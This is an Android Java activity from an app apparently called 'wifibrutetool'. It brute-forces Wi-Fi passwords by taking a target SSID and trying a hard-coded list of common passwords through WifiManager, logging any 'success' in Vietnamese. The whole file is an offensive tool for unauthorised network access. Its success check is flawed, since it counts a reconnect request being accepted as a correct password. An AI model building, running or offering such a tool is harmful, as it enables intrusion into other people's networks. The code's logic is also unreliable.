package com.hihi934.wifibrutetool;

import android.content.Context;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private EditText edtSSID;
    private Button btnStart;
    private TextView txtLog;
    private WifiManager wifiManager;

    // Danh sách mật khẩu thử nghiệm
    private String[] wordlist = {"12345678", "88888888", "00000000", "password", "12344321"};

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        edtSSID = findViewById(R.id.edtSSID);
        btnStart = findViewById(R.id.btnStart);
        txtLog = findViewById(R.id.txtLog);
        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);

        btnStart.setOnClickListener(v -> {
            String ssid = edtSSID.getText().toString();
            if (ssid.isEmpty()) {
                updateLog("Vui lòng nhập tên Wifi!");
                return;
            }
            startBruteForce(ssid);
        });
    }

    private void startBruteForce(String ssid) {
        updateLog("Bắt đầu thử với SSID: " + ssid);
        
        new Thread(() -> {
            for (String pass : wordlist) {
                updateLog("Đang thử mật khẩu: " + pass);
                boolean isConnected = connectToWifi(ssid, pass);
                
                if (isConnected) {
                    updateLog("==> THÀNH CÔNG! Pass: " + pass);
                    break;
                }
                
                try { Thread.sleep(2000); } catch (InterruptedException e) { e.printStackTrace(); }
            }
        }).start();
    }

    private boolean connectToWifi(String ssid, String key) {
        WifiConfiguration wifiConfig = new WifiConfiguration();
        wifiConfig.SSID = String.format("\"%s\"", ssid);
        wifiConfig.preSharedKey = String.format("\"%s\"", key);

        int netId = wifiManager.addNetwork(wifiConfig);
        wifiManager.disconnect();
        wifiManager.enableNetwork(netId, true);
        return wifiManager.reconnect();
    }

    private void updateLog(String message) {
        new Handler(Looper.getMainLooper()).post(() -> {
            txtLog.append("\n" + message);
        });
    }
}
